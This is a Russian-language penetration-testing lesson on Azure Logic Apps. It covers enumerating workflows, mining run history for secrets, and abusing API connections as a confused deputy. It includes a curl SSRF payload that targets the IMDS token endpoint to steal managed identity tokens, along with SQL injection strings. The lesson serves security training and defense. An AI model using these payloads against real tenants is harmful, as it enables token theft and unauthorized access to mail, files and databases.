---
id: cloud-azure-logic-apps
title: "Logic Apps: connector'ы, managed identity и инъекции"
category: cloud
parent: cloud-azure-platform-deep
difficulty: hard
order: 2
tags: [cloud, azure, logic-apps, workflows, connectors, managed-identity, ssrf]
prerequisites: [cloud-azure-platform-deep, cloud-azure-managed-identity]
useful_for:
  - "Пентест Azure Logic Apps"
  - "Эксплуатация connector'ов и managed identity"
  - "Поиск workflow-инъекций"
estimated_minutes: 45
summary: "Logic Apps: триггеры, действия, connector'ы и managed identity. Как low-code workflow держит креды и права, и как через инъекции в параметры получить доступ к данным и сервисам."
---

## Зачем этот урок

Logic Apps — low-code платформа автоматизации Azure. Workflow описывается JSON'ом, состоит из триггеров и действий, а действия используют **connector'ы** (Outlook, SharePoint, SQL, HTTP, Azure) с хранимыми кредами или managed identity. Из-за «no-code» подхода их редко проверяют, хотя один workflow может читать почту, файлы, базы и вызывать ARM от имени managed identity. Для атакующего это «маленький сервисный аккаунт с широкими правами», часто с открытым HTTP-триггером.

## Модель Logic Apps

- **Workflow** — определение (JSON) с `triggers` и `actions`.
- **Trigger** — старт (HTTP request, recurrence, событие Blob, письмо).
- **Action** — шаг (HTTP, compose, condition, connector-операция).
- **Connector** — интеграция с сервисом; аутентификация через connection (API connection) или managed identity.
- **API connection** — ресурс, хранящий креды к внешнему сервису (OAuth-токен, ключ).
- **Managed identity** — для действий, поддерживающих identity-аутентификацию (ARM, Key Vault, Storage).
- **Run history** — логи выполнений с входами/выходами (часто содержат секреты!).

Ключевое: определения workflow можно читать (`Microsoft.Logic/workflows`), а история запусков (`workflow runs`) содержит тела запросов/ответов.

## Инструменты и команды

```bash
# Список Logic Apps
az logic workflow list --query '[].{Name:name,RG:resourceGroup,State:state}'

# Определение workflow
az logic workflow show --resource-group rg --name myflow --query 'definition'
az logic workflow show --resource-group rg --name myflow \
  --query 'definition.actions | keys'

# Триггеры (особенно HTTP)
az logic workflow show --resource-group rg --name myflow \
  --query 'definition.triggers'

# История запусков
az rest --method get \
  --url "https://management.azure.com/subscriptions/SUB/resourceGroups/rg/providers/Microsoft.Logic/workflows/myflow/runs?api-version=2019-05-01" \
  --query 'value[].{Name:name,Status:status}'

# Детали запуска (входы/выходы — тут бывают секреты)
az rest --method get \
  --url "https://management.azure.com/.../workflows/myflow/runs/RUNID/actions?api-version=2019-05-01" \
  --query 'value[].{Name:name,Inputs:inputs,Outputs:outputs}'
```

## Разобранный пример: открытый HTTP-триггер и managed identity

Сценарий: workflow `process-ticket` имеет HTTP-триггер без аутентификации и действие HTTP/ARM с managed identity.

```bash
az logic workflow show --resource-group rg --name process-ticket \
  --query 'definition.triggers'
# {"manual":{"type":"Request","kind":"Http","inputs":{"schema":{...}},"conditions":[]}}

# Получаем callback-URL триггера
az rest --method post \
  --url "https://management.azure.com/.../workflows/process-ticket/triggers/manual/listCallbackUrl?api-version=2019-05-01" \
  --query 'value'
# "https://prod-01.westeurope.logic.azure.com:443/workflows/.../triggers/manual/paths/invoke?api-version=...&sp=...&sv=...&sig=..."

# Вызываем триггер со своими данными
curl -s -X POST "https://prod-01.westeurope.logic.azure.com:443/workflows/.../invoke?sig=..." \
  -H 'Content-Type: application/json' \
  -d '{"ticketId":"1 OR 1=1","url":"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}'
```

Если workflow передаёт параметр `url` в действие HTTP, получаем **SSRF** к IMDS → токен managed identity → ARM. Если `ticketId` попадает в SQL-запрос connector'а — инъекция. История запусков покажет, что произошло, и раскроет токены, если они попали в outputs.

## Connector'ы и креды

Connector'ы хранят креды в API connection. Если у вас есть доступ к API connection (`Microsoft.Web/connections`), вы можете использовать его из своего workflow — то есть действовать от имени чужой интеграции (например, читать чужую почту или SharePoint).

```bash
az resource list --resource-type Microsoft.Web/connections --query '[].name'
az rest --method get --url "https://management.azure.com/.../connections/myoutlook?api-version=2016-06-01" \
  --query '{api:properties.api,status:properties.statuses}'
```

API connection с состоянием `Connected` можно задействовать: создайте свой Logic App, добавьте действие с этим connection — и получите доступ к сервису. Это классический confused deputy: connection принадлежит сервисному аккаунту с широкими правами.

## Чек-лист атаки

1. `az logic workflow list` — инвентаризация.
2. Найти HTTP-триггеры без auth (или с известным callback URL).
3. Изучить действия: HTTP, SQL, ARM, Key Vault.
4. Проверить историю запусков на секреты в inputs/outputs.
5. Проверить API connections и их состояние.
6. Проверить managed identity workflow и её роли.
7. Проверить, можно ли изменить определение workflow (для персистентности).

## Обход защит и edge cases

- **Callback URL.** Если триггер требует SAS-подпись (`sig`), нужен callback URL. Иногда он утекает в логах/документации. Иногда триггер открыт без подписи.
- **IP restrictions.** Триггер может ограничивать по IP; обходится через пивот.
- **Managed identity.** Действие ARM/Key Vault использует identity workflow. Проверяйте её роли.
- **Run history retention.** История может быть выключена или очищена; тогда секреты в логах недоступны.
- **Consumption vs Standard.** Standard Logic Apps (App Service-based) имеют другой runtime и могут давать RCE через файлы.
- **Инъекции.** Параметры workflow попадают в connector-запросы; тестируйте SQL/ODATA/HTTP-инъекции.

## Частые ошибки и подводные камни

- Считать Logic Apps «просто автоматизацией» и не проверять.
- Не смотреть run history: там часто токены и пароли.
- Игнорировать API connections как источник доступа.
- Не проверить managed identity workflow.
- Путать Consumption и Standard: у Standard есть Kudu/файлы.

## Защита и детект

- Не оставлять HTTP-триггеры без аутентификации; использовать SAS/OAuth.
- Ограничивать права managed identity workflow.
- Не логировать секреты в inputs/outputs; включать secure inputs/outputs.
- Ограничить доступ к определениям и run history (`Microsoft.Logic/*/read`).
- Включать диагностические логи и алертить на аномальные запуски.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — открытый HTTP-триггер. Второй — SSRF через действие HTTP. Третий — доступные API connections. Четвёртый — секреты в run history. Пятый — широкая managed identity. Все они дают доступ к данным и сервисам через «безобидную» автоматизацию.

## Практическое задание

1. Создайте Logic App с HTTP-триггером и действием HTTP.
2. Получите callback URL и вызовите триггер.
3. Добавьте managed identity и действие ARM; проверьте, какие ресурсы видны.
4. Включите secure inputs/outputs и проверьте, что секреты не пишутся в историю.

## Что дальше / решение

Из Logic Apps получаем SSRF, креды connector'ов и токены identity. Дальше — использовать их. Зафиксируйте путь «триггер → SSRF/connector → данные» в графе. Если триггер закрыт и history очищена — ищите другие workflow или API connections.

## Разобранный пример 2: API connection как confused deputy

API connection — это ресурс с кредами к внешнему сервису. Если у вас есть права на него (`Microsoft.Web/connections/*`), вы можете использовать чужую интеграцию из своего workflow: connection действует от имени сервисного аккаунта, у которого есть доступ.

```bash
# Инвентаризация connections
az resource list --resource-type Microsoft.Web/connections \
  --query '[].{Name:name,RG:resourceGroup}' --output table

# Смотрим, к какому API и в каком состоянии
az rest --method get \
  --url "https://management.azure.com/subscriptions/SUB/resourceGroups/rg/providers/Microsoft.Web/connections/myoutlook?api-version=2016-06-01" \
  --query '{api:properties.api.name,status:properties.statuses[0].status}'
# {"api":"outlook","status":"Connected"}

# Проверяем владельца connection (часто это service principal с широкими правами)
az rest --method get \
  --url "https://management.azure.com/.../connections/myoutlook?api-version=2016-06-01" \
  --query 'properties.api.id'
```

Connection `Connected` к Outlook/SharePoint/SQL позволяет читать почту, файлы или базу от имени владельца. Это классический confused deputy: вы не имеете прямого доступа к сервису, но connection имеет — и вы действуете через него. Проверяйте также `accessPolicies` connection: иногда туда можно добавить себя, если есть права записи.

## Инъекции в параметры workflow

Параметры, приходящие в workflow, часто попадают в connector-запросы без экранирования. Это даёт SQL/ODATA/HTTP-инъекции.

```yaml
# Фрагмент определения: параметр userInput попадает в SQL-запрос
"Get_rows": {
  "type": "ApiConnection",
  "inputs": {
    "host": {"connection": {"name": "sql-connection"}},
    "method": "get",
    "path": "/datasets/default/query",
    "queries": {"query": "SELECT * FROM users WHERE name='@{triggerBody()?['userInput']}'"}
  }
}
```

Если `userInput = ' OR '1'='1`, запрос вернёт всех пользователей. Аналогично HTTP-действие с подконтрольным URL даёт SSRF, а ODATA-фильтр — инъекцию. Тестируйте все поля, приходящие от триггера, особенно если workflow доступен снаружи. Для проверки используйте историю запусков: она покажет, как именно параметр попал в запрос и какой был ответ.

## Квиз

```quiz
- question: "Почему Logic Apps интересны атакующему?"
  options:
    - "Connector'ы хранят креды, а managed identity даёт доступ к сервисам"
    - "Они только для писем"
    - "Они не имеют прав"
    - "Они публичны по умолчанию"
  answer: 0
  explanation: "Workflow действует от имени connection/identity с широкими правами."
- question: "Где в Logic Apps часто утекают секреты?"
  options:
    - "В истории запусков (inputs/outputs)"
    - "В NSG"
    - "В KMS"
    - "В Route 53"
  answer: 0
  explanation: "Run history хранит тела запросов/ответов, включая токены."
- question: "Что такое API connection?"
  options:
    - "Ресурс, хранящий креды к внешнему сервису"
    - "Тип VNet"
    - "Роль ARM"
    - "Диск"
  answer: 0
  explanation: "API connection аутентифицирует connector от имени сервисного аккаунта."
- question: "Как HTTP-действие Logic App может дать SSRF?"
  options:
    - "Если параметр URL подконтролен, запрос уходит на внутренний адрес (IMDS)"
    - "Оно шифрует данные"
    - "Оно удаляет ресурсы"
    - "Оно меняет регион"
  answer: 0
  explanation: "Подконтрольный URL в HTTP-действии позволяет обратиться к внутренним эндпоинтам."
```

## Где пригодится

- **Пентест Azure:** low-code автоматизация как точка входа.
- **Red team:** SSRF и захват identity через workflow.
- **Blue team:** настройка secure inputs/outputs.
- **Сертификация:** AZ-500 / SC-200.
